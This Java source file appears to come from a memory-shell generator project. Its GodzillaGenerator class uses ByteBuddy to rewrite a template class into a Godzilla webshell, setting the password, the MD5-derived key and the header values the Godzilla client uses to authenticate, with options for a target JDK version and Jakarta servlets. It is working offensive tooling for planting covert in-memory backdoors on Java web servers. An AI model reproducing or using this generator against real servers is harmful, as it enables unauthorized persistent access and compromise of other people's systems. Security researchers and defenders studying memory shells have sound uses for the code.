package com.reajason.javaweb.memsell;

import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJDKVersionVisitorWrapper;
import com.reajason.javaweb.config.GodzillaConfig;
import com.reajason.javaweb.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FieldAccessor;
import net.bytebuddy.implementation.SuperMethodCall;
import net.bytebuddy.matcher.ElementMatchers;
import org.apache.commons.codec.digest.DigestUtils;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator {
    public static byte[] generate(ShellConfig config, GodzillaConfig shellConfig) {
        if (shellConfig.getClazz() == null) {
            throw new IllegalArgumentException("shellConfig.getClazz() == null");
        }
        String md5Key = DigestUtils.md5Hex(shellConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(shellConfig.getPass() + md5Key).toUpperCase();

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(shellConfig.getClazz())
                .name(shellConfig.getClassName())
                .visit(new TargetJDKVersionVisitorWrapper(config.getTargetJdkVersion()))
                .constructor(ElementMatchers.any())
                .intercept(SuperMethodCall.INSTANCE
                        .andThen(FieldAccessor.ofField("pass").setsValue(shellConfig.getPass()))
                        .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
                        .andThen(FieldAccessor.ofField("md5").setsValue(md5))
                        .andThen(FieldAccessor.ofField("headerName").setsValue(shellConfig.getHeaderName()))
                        .andThen(FieldAccessor.ofField("headerValue").setsValue(shellConfig.getHeaderValue())));

        if (config.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}